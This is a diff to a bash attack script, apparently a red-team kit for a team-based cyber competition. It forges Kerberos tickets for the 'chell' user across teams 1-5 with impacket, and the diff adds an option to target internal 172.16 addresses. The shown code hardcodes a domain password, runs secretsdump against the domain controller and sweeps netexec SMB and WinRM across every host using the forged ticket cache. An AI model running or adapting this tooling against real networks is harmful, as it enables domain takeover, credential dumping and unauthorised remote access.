@@ -4,7 +4,7 @@
 # Fully impacket-based, no Windows tools, no logs
 # Default creds: chell:Th3cake1salie!
 # Domain: aperturesciencelabs.org
-# DC: 192.168.20<TEAM>.140
+# DC: 192.168.20<TEAM>.140 (external) / 172.16.3.140 (internal -x)
 # Supports "all" → forges teams 1-5 instantly
 # Creates:
 #   teamN.ccache               — Kerberos ticket cache (identity: chell)
@@ -12,21 +12,24 @@
 # ================================================
 
 usage() {
-  echo "Usage: $0 [-z] <team_number | all> [user:password]"
+  echo "Usage: $0 [-z] [-x] <team_number | all> [user:password]"
   echo "   e.g. $0 5"
   echo "   e.g. $0 all              # teams 1-5 with default creds"
   echo "   e.g. $0 5 bob:password   # override creds"
   echo "   e.g. $0 all bob:password"
   echo "   e.g. $0 -z 5             # use zero.sh dump (offline forge)"
   echo "   e.g. $0 -z all"
+  echo "   e.g. $0 -x 5             # use internal 172.16.x.x IPs"
   exit 1
 }
 
 # Parse flags
 USE_ZERO=0
+USE_INTERNAL=0
 while [[ "$1" == -* ]]; do
   case "$1" in
     -z) USE_ZERO=1; shift ;;
+    -x) USE_INTERNAL=1; shift ;;
     *)  echo "[-] Unknown flag: $1"; usage ;;
   esac
 done
@@ -86,6 +89,25 @@ gen_use_script() {
   local CCACHE="team${TEAM}.ccache"
   local SCRIPT="team${TEAM}_use.sh"
 
+  # Determine IP set for the generated script
+  local IP_CURIOSITY="$DC"
+  local IP_MORALITY IP_INTEL IP_ANGER IP_FACT IP_SPACE IP_ADVENTURE
+  if [[ $USE_INTERNAL -eq 1 ]]; then
+    IP_MORALITY="172.16.1.10"
+    IP_INTEL="172.16.1.11"
+    IP_ANGER="172.16.2.70"
+    IP_FACT="172.16.2.71"
+    IP_SPACE="172.16.3.141"
+    IP_ADVENTURE="172.16.2.72"
+  else
+    IP_MORALITY="192.168.20${TEAM}.10"
+    IP_INTEL="192.168.20${TEAM}.11"
+    IP_ANGER="192.168.20${TEAM}.70"
+    IP_FACT="192.168.20${TEAM}.71"
+    IP_SPACE="192.168.20${TEAM}.141"
+    IP_ADVENTURE="192.168.20${TEAM}.72"
+  fi
+
   cat > "$SCRIPT" <<'SCRIPT_EOF'
 #!/bin/bash
 SCRIPT_EOF
@@ -106,13 +128,13 @@ GOLDUSER="chell"
 
 # All hosts: FQDN → IP
 declare -A HOST_IP=(
-  ["curiosity.\${DOMAIN}"]="${DC}"
-  ["morality.\${DOMAIN}"]="192.168.20${TEAM}.10"
-  ["intelligence.\${DOMAIN}"]="192.168.20${TEAM}.11"
-  ["anger.\${DOMAIN}"]="192.168.20${TEAM}.70"
-  ["fact.\${DOMAIN}"]="192.168.20${TEAM}.71"
-  ["space.\${DOMAIN}"]="192.168.20${TEAM}.141"
-  ["adventure.\${DOMAIN}"]="192.168.20${TEAM}.72"
+  ["curiosity.\${DOMAIN}"]="${IP_CURIOSITY}"
+  ["morality.\${DOMAIN}"]="${IP_MORALITY}"
+  ["intelligence.\${DOMAIN}"]="${IP_INTEL}"
+  ["anger.\${DOMAIN}"]="${IP_ANGER}"
+  ["fact.\${DOMAIN}"]="${IP_FACT}"
+  ["space.\${DOMAIN}"]="${IP_SPACE}"
+  ["adventure.\${DOMAIN}"]="${IP_ADVENTURE}"
 )
 # Ordered list for the menu
 HOST_ORDER=(
@@ -276,8 +298,8 @@ print_commands() {
   echo ""
   echo "--- NETEXEC (all hosts) ---"
   echo ""
-  echo "  netexec smb  ${DC} 192.168.20${TEAM}.10 192.168.20${TEAM}.11 192.168.20${TEAM}.70 192.168.20${TEAM}.71 192.168.20${TEAM}.141 192.168.20${TEAM}.72 -u \$GOLDUSER --use-kcache --continue-on-success"
-  echo "  netexec winrm ${DC} 192.168.20${TEAM}.10 192.168.20${TEAM}.11 192.168.20${TEAM}.70 192.168.20${TEAM}.71 192.168.20${TEAM}.141 192.168.20${TEAM}.72 -u \$GOLDUSER --use-kcache --continue-on-success"
+  echo "  netexec smb  ${IP_CURIOSITY} ${IP_MORALITY} ${IP_INTEL} ${IP_ANGER} ${IP_FACT} ${IP_SPACE} ${IP_ADVENTURE} -u \$GOLDUSER --use-kcache --continue-on-success"
+  echo "  netexec winrm ${IP_CURIOSITY} ${IP_MORALITY} ${IP_INTEL} ${IP_ANGER} ${IP_FACT} ${IP_SPACE} ${IP_ADVENTURE} -u \$GOLDUSER --use-kcache --continue-on-success"
   echo ""
   echo "--- RDP ---"
   echo ""
@@ -330,9 +352,9 @@ while true; do
     5)
       \$(get_cmd secretsdump) "\$DOMAIN/\$GOLDUSER@\$DC_FQDN" -k -no-pass -dc-ip "\$DC_IP" ;;
     6)
-      netexec smb ${DC} 192.168.20${TEAM}.10 192.168.20${TEAM}.11 192.168.20${TEAM}.70 192.168.20${TEAM}.71 192.168.20${TEAM}.141 192.168.20${TEAM}.72 -u "\$GOLDUSER" --use-kcache --continue-on-success ;;
+      netexec smb ${IP_CURIOSITY} ${IP_MORALITY} ${IP_INTEL} ${IP_ANGER} ${IP_FACT} ${IP_SPACE} ${IP_ADVENTURE} -u "\$GOLDUSER" --use-kcache --continue-on-success ;;
     7)
-      netexec winrm ${DC} 192.168.20${TEAM}.10 192.168.20${TEAM}.11 192.168.20${TEAM}.70 192.168.20${TEAM}.71 192.168.20${TEAM}.141 192.168.20${TEAM}.72 -u "\$GOLDUSER" --use-kcache --continue-on-success ;;
+      netexec winrm ${IP_CURIOSITY} ${IP_MORALITY} ${IP_INTEL} ${IP_ANGER} ${IP_FACT} ${IP_SPACE} ${IP_ADVENTURE} -u "\$GOLDUSER" --use-kcache --continue-on-success ;;
     8)
       pick_host 0
       if command -v xfreerdp >/dev/null 2>&1; then
@@ -361,7 +383,12 @@ SCRIPT_EOF
 # ============== FORGE FUNCTION ==============
 forge_team() {
   local TEAM="$1"
-  local DC="192.168.20${TEAM}.140"
+  local DC
+  if [[ $USE_INTERNAL -eq 1 ]]; then
+    DC="172.16.3.140"
+  else
+    DC="192.168.20${TEAM}.140"
+  fi
   local CCACHE="team${TEAM}.ccache"
 
   echo "[*] ================================================"
